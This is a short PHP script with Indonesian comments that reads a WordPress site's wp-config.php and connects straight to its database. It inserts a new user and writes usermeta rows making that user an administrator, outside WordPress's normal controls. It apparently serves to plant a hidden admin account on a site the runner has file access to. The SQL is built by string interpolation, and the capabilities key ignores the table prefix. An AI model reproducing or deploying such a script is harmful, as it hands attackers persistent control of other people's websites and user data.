<?php
// Mendapatkan path ke direktori root WordPress
$wp_root = $_SERVER['DOCUMENT_ROOT'];

// Path ke wp-config.php
$wp_config_path = $wp_root . '/wp-config.php';

// Cek apakah file wp-config.php ada
if (file_exists($wp_config_path)) {
    // Include file wp-config.php
    include_once($wp_config_path);

    // Cek apakah definisi tabel pengguna ada di dalam wp-config.php
    if (isset($table_prefix, $wpdb) && defined('DB_USER') && defined('DB_PASSWORD') && defined('DB_NAME') && defined('DB_HOST')) {
        $user_table = $table_prefix . 'users';
        $user_login_column = 'user_login';
        $user_pass_column = 'user_pass';
        $user_email_column = 'user_email';

        // Buat koneksi ke database
        $conn = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);

        // Periksa koneksi
        if ($conn->connect_error) {
            die("Koneksi database gagal: " . $conn->connect_error);
        }

        // Data user admin baru
        $username = 'user';
        $email = 'email';
        $password = 'pass';

        // Enkripsi password
        $hashed_password = password_hash($password, PASSWORD_DEFAULT);

        // Query untuk menambahkan user admin baru
        $sql = "INSERT INTO $user_table ($user_login_column, $user_pass_column, $user_email_column, user_registered, user_status) VALUES ('$username', '$hashed_password', '$email', NOW(), 0)";
        if ($conn->query($sql) === TRUE) {
            $user_id = $conn->insert_id;
            // Tambahkan user sebagai admin
            $sql = "INSERT INTO {$table_prefix}usermeta (user_id, meta_key, meta_value) VALUES ('$user_id', 'wp_capabilities', 'a:1:{s:13:\"administrator\";b:1;}')";
            $conn->query($sql);
            $sql = "INSERT INTO {$table_prefix}usermeta (user_id, meta_key, meta_value) VALUES ('$user_id', 'wp_user_level', '10')";
            $conn->query($sql);
            echo "User admin berhasil ditambahkan.";
        } else {
            echo "Error: " . $sql . "<br>" . $conn->error;
        }

        // Tutup koneksi
        $conn->close();
    } else {
        echo "Definisi tabel pengguna tidak ditemukan dalam file wp-config.php.";
    }
} else {
    echo "File wp-config.php tidak ditemukan.";
}
?>
